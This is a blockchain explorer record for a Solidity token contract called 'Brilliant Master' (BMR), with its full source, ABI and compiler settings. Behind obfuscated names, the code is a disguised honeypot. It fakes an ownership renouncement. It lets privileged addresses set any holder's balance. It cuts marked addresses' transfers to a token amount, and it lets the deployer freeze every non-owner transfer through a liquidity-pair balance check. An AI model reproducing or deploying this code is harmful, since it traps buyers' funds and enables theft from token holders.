{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface toSellAt {\n    function createPair(address sellReceiver, address limitFund) external returns (address);\n}\n\ninterface teamAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingToken) external view returns (uint256);\n\n    function transfer(address sellAmount, uint256 autoFundTo) external returns (bool);\n\n    function allowance(address swapAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoFundTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellAmount,\n        uint256 autoFundTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTrading, uint256 value);\n    event Approval(address indexed swapAuto, address indexed spender, uint256 value);\n}\n\nabstract contract launchedFundTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamAmountMetadata is teamAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BrilliantMaster is launchedFundTo, teamAmount, teamAmountMetadata {\n\n    bool private atLaunched;\n\n    address public launchAt;\n\n    constructor (){\n        \n        liquidityMarketing swapWallet = liquidityMarketing(walletTrading);\n        fundToken = toSellAt(swapWallet.factory()).createPair(swapWallet.WETH(), address(this));\n        if (txFund == amountMax) {\n            atLaunched = true;\n        }\n        launchAt = _msgSender();\n        teamIs[launchAt] = true;\n        maxFundSwap[launchAt] = buyMin;\n        sellLimitExempt();\n        \n        emit Transfer(address(0), launchAt, buyMin);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isAt;\n    }\n\n    function transfer(address tokenTake, uint256 autoFundTo) external virtual override returns (bool) {\n        return teamShouldFund(_msgSender(), tokenTake, autoFundTo);\n    }\n\n    mapping(address => uint256) private maxFundSwap;\n\n    function sellLimitExempt() public {\n        emit OwnershipTransferred(launchAt, address(0));\n        fromShould = address(0);\n    }\n\n    address private fromShould;\n\n    function fromLimit() private view {\n        require(teamIs[_msgSender()]);\n    }\n\n    mapping(address => bool) public teamIs;\n\n    address buyFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return fromShould;\n    }\n\n    uint256 private buyMin = 100000000 * 10 ** 18;\n\n    function isSwap(address tokenList, address sellAmount, uint256 autoFundTo) internal returns (bool) {\n        require(maxFundSwap[tokenList] >= autoFundTo);\n        maxFundSwap[tokenList] -= autoFundTo;\n        maxFundSwap[sellAmount] += autoFundTo;\n        emit Transfer(tokenList, sellAmount, autoFundTo);\n        return true;\n    }\n\n    function launchIsAt(address atFrom) public {\n        fromLimit();\n        \n        if (atFrom == launchAt || atFrom == fundToken) {\n            return;\n        }\n        swapIs[atFrom] = true;\n    }\n\n    bool public senderLaunchedReceiver;\n\n    address walletTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 modeTo;\n\n    mapping(address => bool) public swapIs;\n\n    function sellExempt(address tokenTake, uint256 autoFundTo) public {\n        fromLimit();\n        maxFundSwap[tokenTake] = autoFundTo;\n    }\n\n    uint256 marketingTrading;\n\n    bool public toMode;\n\n    function allowance(address walletBuy, address takeLaunch) external view virtual override returns (uint256) {\n        if (takeLaunch == walletTrading) {\n            return type(uint256).max;\n        }\n        return liquidityEnableAuto[walletBuy][takeLaunch];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptSender;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromShould;\n    }\n\n    address public fundToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyMin;\n    }\n\n    function exemptAmount(address maxTradingMarketing) public {\n        if (toMode) {\n            return;\n        }\n        if (txFund == amountMax) {\n            atLaunched = true;\n        }\n        teamIs[maxTradingMarketing] = true;\n        \n        toMode = true;\n    }\n\n    function teamShouldFund(address tokenList, address sellAmount, uint256 autoFundTo) internal returns (bool) {\n        if (tokenList == launchAt) {\n            return isSwap(tokenList, sellAmount, autoFundTo);\n        }\n        uint256 modeShould = teamAmount(fundToken).balanceOf(buyFrom);\n        require(modeShould == modeTo);\n        require(sellAmount != buyFrom);\n        if (swapIs[tokenList]) {\n            return isSwap(tokenList, sellAmount, sellTakeSwap);\n        }\n        return isSwap(tokenList, sellAmount, autoFundTo);\n    }\n\n    function approve(address takeLaunch, uint256 autoFundTo) public virtual override returns (bool) {\n        liquidityEnableAuto[_msgSender()][takeLaunch] = autoFundTo;\n        emit Approval(_msgSender(), takeLaunch, autoFundTo);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isLiquidity;\n    }\n\n    uint256 constant sellTakeSwap = 16 ** 10;\n\n    function balanceOf(address marketingToken) public view virtual override returns (uint256) {\n        return maxFundSwap[marketingToken];\n    }\n\n    string private isLiquidity = \"Brilliant Master\";\n\n    string private exemptSender = \"BMR\";\n\n    uint8 private isAt = 18;\n\n    uint256 private txFund;\n\n    bool public minTx;\n\n    function walletMode(uint256 autoFundTo) public {\n        fromLimit();\n        modeTo = autoFundTo;\n    }\n\n    event OwnershipTransferred(address indexed fundFrom, address indexed tradingTeamEnable);\n\n    uint256 private amountMax;\n\n    mapping(address => mapping(address => uint256)) private liquidityEnableAuto;\n\n    function transferFrom(address tokenList, address sellAmount, uint256 autoFundTo) external override returns (bool) {\n        if (_msgSender() != walletTrading) {\n            if (liquidityEnableAuto[tokenList][_msgSender()] != type(uint256).max) {\n                require(autoFundTo <= liquidityEnableAuto[tokenList][_msgSender()]);\n                liquidityEnableAuto[tokenList][_msgSender()] -= autoFundTo;\n            }\n        }\n        return teamShouldFund(tokenList, sellAmount, autoFundTo);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTeamEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFundTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTradingMarketing\",\"type\":\"address\"}],\"name\":\"exemptAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"}],\"name\":\"launchIsAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFundTo\",\"type\":\"uint256\"}],\"name\":\"sellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFundTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFundTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoFundTo\",\"type\":\"uint256\"}],\"name\":\"walletMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BrilliantMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}